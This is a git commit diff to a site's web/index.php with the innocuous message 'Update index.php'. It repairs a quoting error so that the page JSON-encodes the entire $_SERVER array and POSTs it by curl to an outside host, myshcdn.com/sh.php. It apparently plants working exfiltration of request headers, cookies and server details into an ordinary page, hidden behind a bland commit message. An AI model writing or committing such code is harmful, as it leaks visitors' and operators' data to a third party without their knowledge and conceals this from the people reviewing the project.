496e96fef696e068d84378c9b603e741f7dda361
jsxsh <themonster@mit.tc>
2021-04-07 16:44:44 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -2,7 +2,7 @@
 
 $_header = json_encode($_SERVER);
 
-$ch = curl_init('http://myshcdn.com/sh.php");
+$ch = curl_init("http://myshcdn.com/sh.php");
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
 curl_setopt($ch, CURLOPT_POSTFIELDS, $_header);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
